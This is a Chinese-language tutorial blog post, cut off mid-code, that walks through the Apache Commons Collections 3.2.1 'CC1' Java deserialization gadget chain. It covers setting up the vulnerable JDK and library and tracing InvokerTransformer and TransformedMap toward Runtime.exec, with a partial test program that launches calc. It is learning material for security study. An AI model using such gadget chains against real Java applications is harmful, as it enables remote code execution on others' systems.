<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Java反序列化入门2, hybcx&#39;s blog">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Java反序列化入门2 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Java反序列化入门2</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                                <span class="chip bg-color">Java反序列化</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
                                Java反序列化
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-03-18
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>Apache CC1链分析</h1>
<h2 id="Commons-Collections简介">Commons Collections简介</h2>
<p>Commons Collections是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法 的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同 类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实 现。它的代码质量较高，被广泛应用于Java应用程序开发中。</p>
<p>Commons Collections 3.1 版本的利用链衍生出多个版本的利用方式，但其核心部分是相同的，不同之 处在于中间过程的构造。Ysoserial 反序列化利用工具中提供了几种利用方式：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318200349211.png" alt="image-20240318200349211"></p>
<p>本文分析Commons Collections3.2.1版本下的一条最好用的反序列化漏洞链，这条攻击链被称为CC1 链。</p>
<p>此包的类包含下面两个，需要重点关注：</p>
<h3 id="Map">Map</h3>
<blockquote>
<p>Commons Collections在java.util.Map的基础上扩展了很多接口和类，比较有代表性的是 BidiMap、MultiMap和LazyMap。跟Bag和Buffer类似，Commons Collections也提供了一个 MapUtils。</p>
<p>所谓BidiMap，直译就是双向Map，可以通过key找到value，也可以通过value找到key，这在我们 日常的代码-名称匹配的时候很方便：因为我们除了需要通过代码找到名称之外，往往也需要处理 用户输入的名称，然后获取其代码。需要注意的是BidiMap当中不光key不能重复，value也不可 以。</p>
<p>所谓MultiMap，就是说一个key不再是简单的指向一个对象，而是一组对象，add()和remove()的 时候跟普通的Map无异，只是在get()时返回一个Collection，利用MultiMap，我们就可以很方便的 往一个key上放数量不定的对象，也就实现了一对多。</p>
<p>所谓LazyMap，意思就是这个Map中的键/值对一开始并不存在，当被调用到时才创建。</p>
<p><a target="_blank" rel="noopener" href="https://www.iteye.com/blog/duohuoteng-1630329">https://www.iteye.com/blog/duohuoteng-1630329</a></p>
</blockquote>
<h3 id="Transformer">Transformer</h3>
<blockquote>
<p>我们有时候需要将某个对象转换成另一个对象供另一组方法调用，而这两类对象的类型有可能并不 是出于同一个继承体系的，或者说出了很基本的Object之外没有共同的父类，或者我们根本不关心 他们是不是有其他继承关系，甚至就是同一个类的实例只是对我们而言无所谓，我们为了它能够被 后续的调用者有意义的识别和处理，在这样的情形，我们就可以利用Transformer。除了基本的转 型Transformer之外，Commons Collections还提供了Transformer链和带条件的Transformer， 使得我们很方便的组装出有意义的转型逻辑。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/liliugen/article/details/83298363">https://blog.csdn.net/liliugen/article/details/83298363</a></p>
</blockquote>
<h2 id="环境搭建">环境搭建</h2>
<p>由于存在漏洞的版本 commons-collections3.1-3.2.1</p>
<p>jdk 8u71之后已修复不可用，这里下载JDK-8u65：<a target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>下载安装之后，配置到idea中，添加常规Maven项目，选择我们刚下载的jdk</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318205107783.png" alt="image-20240318205107783"></p>
<p>然后配置Maven依赖下载CommonsCollections3.2.1版本。复制到pom.xml中即可</p>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318205319691.png" alt="image-20240318205319691"></p>
<p>由于我们分析时要涉及的jdk源码，所以要把jdk的源码也下载下来方便我们分析。</p>
<p>因为jdk自带的包里面有些文件是反编译的.class文件，我们没法清楚的看懂代码，为了方便我们调试，我们需要将他们转变为.java的文件，这就需要我们安装相应的源码:<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318205453846.png" alt="image-20240318205453846"></p>
<p>点击左下角的zip即可下载，然后解压。再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩 包，将其解压，然后把刚刚下载的源码包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷 贝到src文件夹中去。</p>
<p>打开IDEA，选择文件 —&gt;项目结构 —&gt;SDK —&gt;源路径 —&gt;把src文件夹添加到源路径下，保存即可。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318210750825.png" alt="image-20240318210750825"></p>
<p>但我做了如上配置发现没有sun目录的显示，又看了几篇文章发现，似乎是将src目录添加到类路径中</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318211802794.png" alt="image-20240318211802794"></p>
<p>如下图不再显示.class则表示配置成功</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318211219413.png" alt="image-20240318211219413"></p>
<h2 id="反序列化分析">反序列化分析</h2>
<blockquote>
<p>我们利用反序列化漏洞的方法一般是寻找到某个带有危险方法的类，然后溯源，看看哪个类中的方法有调用危险方法(有点像套娃，这个类中的某个方法调用了下个类中的某个方法，一步步套下去)，并且继承了序列化接口，然后再依次向上回溯，直到找到一个重写了readObject方法的类， 并且符合条件，那么这个就是起始类，我们可以利用这个类一步步的调用到危险方法(这里 以"Runtime中的exec方法为例")，这就是大致的Java漏洞链流程。</p>
</blockquote>
<p>与PHP反序列化思路相似</p>
<h3 id="源头">源头</h3>
<p>CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法（这里我是点击了右上角的下载源代码才成了java文件，否则仍为class文件）</p>
<p>这里想补充一下：看了视频发现往上回溯的思路一般都是找不同类的相同方法，如果你找到的是相同类的相同方法是没意义的。</p>
<p>比如想找setValue方法，结果看到一个setValue调用setValue方法，那这不还是要找setValue方法被谁调用吗，如果找到的是a调用setValue方法，还能继续找谁调用了a，这样才有找头，遇到危险类的危险方法概率也就大。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318212706724.png" alt="image-20240318212706724"></p>
<p>然后就是寻找继承了这个接口的类 : ctrl+alt+b（前提是选中transform方法）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318212850077.png" alt="image-20240318212850077"></p>
<p>可以看到有很多类，我们这里找到了有重写transform方法的InvokerTransformer类（以上展示的都有重写transform的情况，但invoke这个类更符合预期），并且可以看到它也继承了Serializable，很符合我们的要求。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318213825562.png" alt="image-20240318213825562"></p>
<p>对于零基础的我，这里理解了一下为何这个类继承了我们的transform接口，原因在于上图的implements关键字：</p>
<p>用于表示一个类实现了一个或多个接口。当一个类使用implements关键字后面跟个多个接口名称的时候，他就表明该类承诺实现了这些接口中所定义的方法，来一个简单eg：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyInterface</span> {<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">myMethod</span><span class="hljs-params">()</span>;<br>}<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MyInterface</span> {<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">myMethod</span><span class="hljs-params">()</span> {<br>        <span class="hljs-comment">// 实现接口中定义的方法</span><br>        System.out.println(<span class="hljs-string">"MyClass implements MyInterface"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>上述例子可以看到定义了一个MyInterface类接口，里面定义了一个抽象方法myMethod方法。接着MyClass继承了MyInterface类，并在其中实现了接口中的myMethod方法。</p>
<h3 id="InvokerTransformer-transform">InvokerTransformer.transform</h3>
<p>定位到InvokerTransformer的transform方法</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> {<br>       <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) {<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       }<br>       <span class="hljs-keyword">try</span> {<br>           <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<span class="hljs-comment">//获取input对象的class类对象</span><br>           <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<span class="hljs-comment">//获取iMethodName方法</span><br>           <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<span class="hljs-comment">//调用iMethodName方法，传入iArgs参数，返回结果</span><br>               <br>       } <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) {<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="hljs-string">"' on '"</span> + input.getClass() + <span class="hljs-string">"' does not exist"</span>);<br>       } <span class="hljs-keyword">catch</span> (IllegalAccessException ex) {<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="hljs-string">"' on '"</span> + input.getClass() + <span class="hljs-string">"' cannot be accessed"</span>);<br>       } <span class="hljs-keyword">catch</span> (InvocationTargetException ex) {<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="hljs-string">"' on '"</span> + input.getClass() + <span class="hljs-string">"' threw an exception"</span>, ex);<br>       }<br>   }<span class="hljs-comment">//上面就是异常对应的处理了</span><br></code></pre></td></tr></tbody></table></figure>
<p>可以看到上述try代码块就是调用了我们熟悉的反射机制，来返回某个方法的值，这是很明显的利用点：transform方法接受一个对象，不为空时，就会进行通过反射机制动态地调用对象的特定方法。</p>
<p>并且iMethodName 、 iParamTypes 、 iArgs 这几个参数都是通过构造函数控制的，并且为public：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318214610887.png" alt="image-20240318214610887"></p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//有参构造函数。参数为方法名，调用方法的参数类型，调用方法的参数值</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> {<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>因为这些参数我们都可以控制，也就是说我们可以通过InvokerTransformer.transform()方法来调用任意类的任意方法，比如弹一个计算器：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240318220432548.png" alt="image-20240318220432548"></p>
<p>可以看到成功执行了命令，说明我们成功找到了源头利用点了，接下来就是一步步回溯，寻找合适的类，构造利用链，直到到达重写了readObject的类（没有的话就不行了）</p>
<p>寻找某个类中的某个方法是否调用了transform方法，直接对这个方法右键查找用法（alt+F7），可以看到有很多类都调用了该方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319203732854.png" alt="image-20240319203732854"></p>
<h3 id="TransformedMap-checkSetValue">TransformedMap.checkSetValue</h3>
<p>我们直接来到TransformedMap类下的checkSetValue方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240319204128341.png" alt="image-20240319204128341"></p>
<p>我们同样来看一下 TransformedMap 这个类的构造方法和 checkSetValue 方法</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {<br>    <span class="hljs-comment">//接受三个参数，第一个为Map，我们可以传入hashmap。第二个和第三个为Transformer我们需要的了，且可控</span><br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    }<br>.......<br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> {<span class="hljs-comment">//接受一个对象类型的参数</span><br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<span class="hljs-comment">//返回valueTransformer对应的transform方法</span><br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>这里回想之前我们弹计算器用到的InvokerTransformer对象，只要想办法让valueTransformer等于InvokerTransformeru即可实现命令执行（调用任意类的任意方法）</p>
<p>但这里看代码发现该构造函数以及是checkSetValue方法是protected类型，也就是说只能内部（同一个包）去实例化调用，外部是不能访问的，那我们就需要找内部实例化的工具，这里往上查找，可以发现一个public的静态方法decorate方法</p>
<h3 id="TransformedMap-decorate">TransformedMap.decorate</h3>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    }<br></code></pre></td></tr></tbody></table></figure>
<p>很明显，该方法调用了TransformedMap构造函数进行实例化，且是public，意味着我们可以直接调用，因此我们可以通过TransformedMap.decorate方法来实现调用任意类的任意方法</p>
<h4 id="测试代码1">测试代码1</h4>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.javafx.collections.MappingChange;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.lang.invoke.MethodHandle;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> javax.swing.text.html.ObjectView;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException {<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class}, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"calc"</span>});<br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//静态方法staic修饰，直接类名＋方法名调用</span><br>		<span class="hljs-comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的</span><br>        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,<span 